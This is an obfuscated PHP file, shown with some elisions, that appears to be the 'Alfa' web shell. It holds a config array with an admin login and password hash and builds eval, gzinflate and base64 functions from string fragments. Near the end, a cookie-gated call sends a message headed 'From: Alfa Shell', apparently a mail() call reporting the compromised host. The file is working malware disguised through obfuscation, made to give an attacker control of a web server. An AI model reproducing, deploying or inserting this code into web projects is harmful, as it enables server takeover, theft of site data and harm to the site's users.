<?php
$GLOBALS['dicgVfFCYw'] = array(
 'usCTxaikkLMf' => 'admin',
 'panAiZjHasHC' => 'a6f452ec3293d7fb72c5b677257b20ec',
 'samKLpRGuwjt' => '0',
 'loTLmqLvAVhn' => '403',
 'shauNjuXRuqy' => '1',
 'poXCjIRapmwy' => true,
...
$okUbfUBfEI = 'f'.'unct'.'ion'.'_exi'.'s'.'t'.'s';
$EzKSLigWch = 'ch'.'a'.'r'.'Co'.'deA'.'t';
$eTxvkUXfZn = 'e'.'v'.'a'.'l';
$hmLjSbWMxb = 'gz'.'i'.'n'.'fl'.'a'.'t'.'e';
if(!$okUbfUBfEI('b'.'as'.'e64'.'_e'.'nc'.'o'.'d'.'e')){
 function zkQAzcXYHn($data){
  ...
  do
  {
   $o1 = $EzKSLigWch($data, $i++);
   $o2 = $EzKSLigWch($data, $i++);
   $o3 = $EzKSLigWch($data, $i++);
   $bits = $o1 << 16 | $o2 << 8 | $o3;
   $h1 = $bits >> 18 & 0x3f;
   $h2 = $bits >> 12 & 0x3f;
   $h3 = $bits >> 6 & 0x3f;
...
{
 function zkQAzcXYHn($s)
 {
  $b='b'.'as'.'e64'.'_e'.'nc'.'o'.'d'.'e';
  return $b($s);
 }
}
if (!$okUbfUBfEI('b' . 'ase' . '64' . '_decode' . ''))
{
 function UWVXTTEgbe($input)
 {
...
$GLOBALS['DB_NAME'] = $GLOBALS['dicgVfFCYw'];
$check = false;
...
if ($check)
{
 ...
 foreach ($GLOBALS['dicgVfFCYw'] as $key => $value)
 {
...
@session_start();
function alfa_str($LVDCTiHS,$iwizUwc,$dONDSzY){$_FAMI_rtEnNRK="\x63\x68\x72\x62\x69\x6E\x64\x65\x63";$_QI_myqf="\x73\x75\x62\x73\x74\x72";$_aA_HvR=$_QI_myqf($_FAMI_rtEnNRK,$LVDCTiHS,$iwizUwc);return $_aA_HvR($dONDSzY);}
...
@set_time_limit(0);
if(!isset($_COOKIE['alfa_checkpagegelogin'])){
$IqqqEv_hhKwBK=alfa_str(25*3+25-100,1*3,100+50-41).
alfa_str(0,5*2-7,9*11-2)."\x69"
...
$YwjUv=__ZGVjb2Rlcg(chr(82).chr(110).'J'.chr(118)."b".'T'.'o'.chr(103).chr(73).chr(69)."F"."s".chr(90)."m"."E".'g'."U".'2'.alfa_str(0,3,500-400+4).chr(108).chr(98).chr(71).'w'.'g'."T"."G".chr(57).'j'.'Y'.'X'.chr(82).'p'.'b'.chr(50).chr(52)."g").$QlKzKMxhxcIcU;
@$IqqqEv_hhKwBK($CXqXJTH,$gNiVGlz,$tAnJtPb,$YwjUv);@setcookie('alfa_checkpagegelogin',time(),time()+86400);
}
